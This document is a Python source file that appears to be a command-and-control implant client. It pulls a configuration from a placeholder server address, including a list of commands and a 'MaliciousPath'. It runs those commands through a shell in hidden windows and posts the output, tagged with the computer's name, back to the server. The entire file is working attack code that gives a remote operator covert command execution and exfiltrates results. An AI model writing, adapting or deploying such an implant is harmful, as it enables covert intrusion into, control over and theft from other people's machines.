import requests
import json
import sys, string, os
import subprocess
import datetime

SERVERADDRESS = 'http://IP'
CONFIGURATIONPATH = '/Configuration'
HEADERS = {'UUID':'UUID-01'}
COMMANDSTOEXE = None
MALICIOUSURL = None


def HttpGetRequest(path, parameters):
    #FOR TLS
    #r = requests.Session()
    r = requests.get(SERVERADDRESS+path ,params=parameters, headers=HEADERS)
    return r.text

def HttpPostRequest(path, parameters):
    #FOR TLS
    #r = requests.Session()
    r = requests.post(SERVERADDRESS+path, data=parameters, headers=HEADERS)
    return r.text

def conf():

    global SERVERADDRESS
    global COMMANDSTOEXE
    global MALICIOUSURL

    conf = json.loads((HttpGetRequest(CONFIGURATIONPATH,None)))
    #print(conf)
    #print(json.dumps(conf))
    SERVERADDRESS = 'http://'+conf['Server']
    COMMANDSTOEXE = conf['Commands']
    MALICIOUSURL = SERVERADDRESS+conf['MaliciousPath']

def RunCommand(command):
#    run = os.popen(command)
#    results = run.read()
#    run.close()
#    return results

    run = subprocess.Popen(command, shell=True,stdout=subprocess.PIPE)
    cmd_out, cmd_err = run.communicate()
    print(cmd_out.decode("utf-8"))
    return (cmd_out.decode("utf-8"))

def subprocess_args(include_stdout=True):
    # The following is true only on Windows.
    if hasattr(subprocess, 'STARTUPINFO'):
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        # Windows doesn't search the path by default. Pass it an environment so
        # it will.
        env = os.environ
    else:
        si = None
        env = None
    if include_stdout:
        ret = {'stdout': subprocess.PIPE}
    else:
        ret = {}

    ret.update({'stdin': subprocess.PIPE,
                'stderr': subprocess.PIPE,
                'startupinfo': si,
                'env': env })
    return ret


def launchWithoutConsole(command, args):
   """Launches 'command' windowless"""
   startupinfo = subprocess.STARTUPINFO()
   startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

   run = subprocess.Popen([command] + args, startupinfo=startupinfo,stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
   cmd_out, cmd_err = run.communicate()
   PRINT(cmd_out.decode("utf-8"))
   return (cmd_out.decode("utf-8"))

def PreperToSend(type,str):
    j = json.dumps({'computer':os.environ['COMPUTERNAME'],'type':type,'data':str})
    return j

def Activate():
    try:
        HttpPostRequest('/Commands',PreperToSend("Activated",str(datetime.datetime.now())+'\r\n'))
    except:
        None
    if COMMANDSTOEXE is not None:
        for command in COMMANDSTOEXE:
            try:
                HttpPostRequest('/Commands',PreperToSend(command.split()[0],subprocess.check_output(command,**subprocess_args(False),shell=True).decode("utf-8")))
            except:
                None

conf()
Activate()
#print(loadJson(PreperToSend('systeminfo',RunCommand('systeminfo'))))

#HttpPostRequest(SERVERADDRESS,'/systeminfo',(PreperToSend('systeminfo',RunCommand('systeminfo'))))

#HttpPostRequest(SERVERADDRESS,'\ClientInfo',)
